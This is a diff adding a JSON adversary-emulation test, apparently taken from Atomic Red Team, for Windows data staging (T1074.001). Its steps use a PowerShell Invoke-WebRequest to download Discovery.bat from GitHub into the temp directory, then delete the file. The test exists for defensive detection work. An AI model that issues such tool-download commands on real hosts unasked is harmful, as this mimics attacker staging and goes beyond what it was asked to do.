@@ -1,0 +1,52 @@
+{
+  "id": "107706a5-6f9f-451a-adae-bab8c667829f",
+  "name": "Stage data from Discovery.bat",
+  "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "1f56f934-af31-487f-8194-3ffdbe4a3034",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "500fda26-5050-4615-803d-c1a774ec9dff",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "1f56f934-af31-487f-8194-3ffdbe4a3034",
+      "p": "on-success",
+      "o": "500fda26-5050-4615-803d-c1a774ec9dff"
+    },
+    {
+      "s": "1f56f934-af31-487f-8194-3ffdbe4a3034",
+      "p": "on-failure",
+      "o": "500fda26-5050-4615-803d-c1a774ec9dff"
+    }
+  ],
+  "tags": [
+    "T1074.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_file",
+      "type": "path",
+      "description": "Location to save downloaded discovery.bat file",
+      "value": "$env:TEMP\\discovery.bat"
+    }
+  ]
+}
